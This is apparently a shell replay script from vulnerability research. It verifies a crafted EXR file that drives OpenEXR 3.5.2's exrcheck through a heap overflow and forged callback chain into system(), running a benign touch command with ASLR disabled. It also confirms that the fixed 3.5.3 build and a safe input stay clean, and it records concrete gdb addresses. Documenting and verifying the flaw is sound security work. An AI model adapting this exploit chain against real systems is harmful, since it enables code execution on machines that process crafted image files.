#!/bin/sh
# W211: one-command replay.  The UNMODIFIED pinned 3.5.2 exrcheck, in the
# shipped `-s -c` in-memory stream mode, runs the file-carried benign command
# `touch /tmp/w202m` through the forged opaque-callback -> memcpy(ctxt,src,104)
# -> ctxt->free_fn -> system chain, with ASLR explicitly OFF.  Fixed 3.5.3 and
# the safe input are clean.  This is a second shipped-tool surface, not a wire
# route and not full rung 5.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p evidence

for spec in \
    'src/openexr-3.5.2/src/bin/exrcheck/main.cpp bff9a108e6c1ab14c0b303dd05a06413774e1e8b8ad73103e748de91b491b5f6' \
    'src/openexr-3.5.2/src/lib/OpenEXRUtil/ImfCheckFile.cpp 48b68e0fbab0644bf027f74251e2113f1ea311f9f6fc665eea964b8c350029ef' \
    'src/openexr-3.5.2/src/lib/OpenEXRCore/internal_zstd.c 736dad696b6263fd5f715ccf1d93ac7104dc5f50994a769046e586af828abcea' \
    'cases/make_w211_poc.py 1e524b0a897db468468ad889a2d3c3e6ac1afda439a13fb8a8a2c2c0e0f7c069' \
    'cases/make_w202_poc.py f884e414c180bde4bb036547e65a8c5b95b269f141afb1b98a3764f6bed43402' \
    'cases/w195-pre-copy2-dump.bin f7c32f6ad820de0532396426d0ad9a8aa58440071636b03e1592cf766daffdc0' \
    'harness/w211-chain-attribution.cmd 79824e208d36cc12a92c62401483d54b0b7b61d35767f7756bd59d2703018ac2' \
    'cases/w211-stream-chain.exr 12a1f12092e1302b55d3cdf89c43837cf56faace8620b4a8c91ca393407f50bf'
do
    set -- $spec
    test "$(sha256sum "$1" | cut -d' ' -f1)" = "$2"
done

RAW=$(mktemp)
EXPECTED=$(mktemp)
MARKER=/tmp/w202m
trap 'rm -f "$RAW" "$EXPECTED" "$MARKER"' EXIT

# The committed generator reproduces the pinned EXR byte-exact.
cp cases/w211-stream-chain.exr "$EXPECTED"
python3 cases/make_w211_poc.py > /dev/null
cmp -s "$EXPECTED" cases/w211-stream-chain.exr

# Vulnerable build reaches the pinned sink in stream mode.
set +e
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:log_path=stderr \
    timeout 20 ./build-vuln-asan/bin/exrcheck -s -c cases/w211-stream-chain.exr \
    > "$RAW" 2>&1
asan_rc=$?
set -e
test "$asan_rc" -ne 0
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' "$RAW"
grep -q 'READ of size 3072' "$RAW"
grep -q 'internal_zstd.c:472' "$RAW"

# Safe input: clean, no marker.
rm -f "$MARKER"
set +e
timeout 20 setarch "$(uname -m)" -R ./build-vuln-plain/bin/exrcheck -s -c \
    cases/baseline.exr > "$RAW" 2>&1
safe_rc=$?
set -e
test "$safe_rc" -eq 0
grep -q 'OK' "$RAW"
test ! -f "$MARKER"

# Fixed build: rejects the same crafted file, no marker.
rm -f "$MARKER"
set +e
timeout 20 setarch "$(uname -m)" -R ./build-fixed-plain/bin/exrcheck -s -c \
    cases/w211-stream-chain.exr > "$RAW" 2>&1
fixed_rc=$?
set -e
test "$fixed_rc" -eq 1
grep -q 'bad' "$RAW"
test ! -f "$MARKER"

# Three plain ASLR-off runs: command side effect each time.
i=0
while test "$i" -lt 3; do
    rm -f "$MARKER"
    set +e
    timeout 20 setarch "$(uname -m)" -R ./build-vuln-plain/bin/exrcheck -s -c \
        cases/w211-stream-chain.exr > "$RAW" 2>&1
    plain_rc=$?
    set -e
    test "$plain_rc" -eq 139
    test -f "$MARKER"
    printf 'PLAIN_RUN_%d rc=%d marker=present\n' "$((i + 1))" "$plain_rc"
    i=$((i + 1))
done

# gdb attribution: every pointer and the command are file-carried; gdb only
# turns off ASLR and sets breakpoints.
rm -f "$MARKER"
timeout 60 gdb -q -batch \
    -ex 'set args -s -c cases/w211-stream-chain.exr' \
    -x harness/w211-chain-attribution.cmd \
    ./build-vuln-plain/bin/exrcheck > "$RAW" 2>&1
grep -q '^DEST=0x55555582a700$' "$RAW"
grep -q '^SLOT_ADDR=0x55555582ab40 SLOT=0x55555582ab70 REL=1088$' "$RAW"
grep -q '^CTXT=0x[0-9a-f]* FREEFN_BEFORE=0x[0-9a-f]* UNP=0x[0-9a-f]* SZ=104 TARGET=0x7ffff7feb900$' "$RAW"
grep -q '^MEMCPY_RDI=0x[0-9a-f]* RSI=0x[0-9a-f]* RDX=104 SRC_FREEFN=0x7ffff7658750$' "$RAW"
grep -q '^SYSTEM_RDI=0x55555582ab70$' "$RAW"
grep -q 'touch /tmp/w202m' "$RAW"
test -f "$MARKER"

{
    echo 'MODE=exrcheck -s -c, shipped in-memory stream API, file path still required'
    echo 'GEN=committed make_w211_poc.py reproduces the pinned EXR byte-exact'
    echo "ASAN_SINK_RC=$asan_rc heap-buffer-overflow READ=3072 internal_zstd.c:472=1"
    echo "SAFE_RC=$safe_rc marker=absent FIXED_RC=$fixed_rc marker=absent"
    echo 'ASLR=off in plain and gdb runs (setarch -R / disable-randomization on)'
    echo 'DEST=0x55555582a700 SLOT_REL=1088 SLOT=0x55555582ab70'
    echo 'TARGET=0x7ffff7feb900 SRC_FREEFN=0x7ffff7658750 SZ=104'
    echo 'SYSTEM_RDI=0x55555582ab70 COMMAND=touch /tmp/w202m'
    echo 'THREE_PLAIN_RUNS=rc139 marker=present'
    echo 'RESULT PASS'
} > evidence/w211-stream-mode-command.out

printf 'RESULT PASS\n'
sha256sum evidence/w211-stream-mode-command.out
